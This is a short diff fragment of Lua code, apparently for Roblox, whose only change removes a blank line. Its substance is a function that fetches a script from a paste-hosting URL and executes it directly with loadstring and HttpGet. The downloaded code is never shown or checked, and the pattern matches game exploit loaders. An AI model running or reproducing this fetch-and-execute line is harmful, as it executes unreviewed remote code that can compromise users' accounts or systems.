@@ -1,4 +1,3 @@
-
 local function s1() 
  loadstring(game:HttpGet("https://cdn.sourceb.in/bins/crJPD2Dqs2/0", true))()
 end 
